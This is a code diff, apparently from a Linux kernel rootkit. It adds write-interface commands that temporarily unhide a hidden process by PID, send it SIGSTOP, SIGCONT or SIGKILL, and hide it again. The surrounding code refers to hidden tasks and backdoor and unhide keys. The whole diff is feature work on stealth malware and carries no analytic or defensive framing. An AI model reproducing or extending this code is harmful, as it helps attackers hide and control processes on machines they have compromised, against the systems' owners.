@@ -447,6 +447,9 @@ enum {
 	/** misc */
 	Opt_journalclt,
 	Opt_fetch_base_address,
+	Opt_signal_task_stop,
+	Opt_signal_task_cont,
+	Opt_signal_task_kill,
 
 #ifdef DEBUG_RING_BUFFER
 	/**debug */
@@ -475,6 +478,9 @@ static const match_table_t tokens = {
 
 	{ Opt_journalclt, "journal-flush" },
 	{ Opt_fetch_base_address, "base-address=%d" },
+	{ Opt_signal_task_stop, "signal-task-stop=%d" },
+	{ Opt_signal_task_cont, "signal-task-cont=%d" },
+	{ Opt_signal_task_kill, "signal-task-kill=%d" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -510,6 +516,16 @@ void _crypto_cb(const u8 *const buf, size_t buflen, size_t copied,
 		set_elfbits(bits);
 	}
 #endif
+}
+static void _run_send_sig(int sig, pid_t pid, bool restart)
+{
+	struct hidden_status status = { 0 };
+	if (kv_find_hidden_pid(&status, pid)) {
+		kv_hide_task_by_pid(pid, 0, CHILDREN);
+		kv_send_signal(sig, status.task);
+		if (restart)
+			kv_hide_task_by_pid(pid, 0, CHILDREN);
+	}
 }
 
 #define CMD_MAXLEN 128
@@ -637,6 +653,18 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 				set_elfbits(bits);
 			}
 		} break;
+		case Opt_signal_task_stop:
+			if (sscanf(args[0].from, "%d", &pid) == 1)
+				_run_send_sig(SIGSTOP, pid, true);
+			break;
+		case Opt_signal_task_cont:
+			if (sscanf(args[0].from, "%d", &pid) == 1)
+				_run_send_sig(SIGCONT, pid, true);
+			break;
+		case Opt_signal_task_kill:
+			if (sscanf(args[0].from, "%d", &pid) == 1)
+				_run_send_sig(SIGKILL, pid, false);
+			break;
 		default:
 			break;
 		}
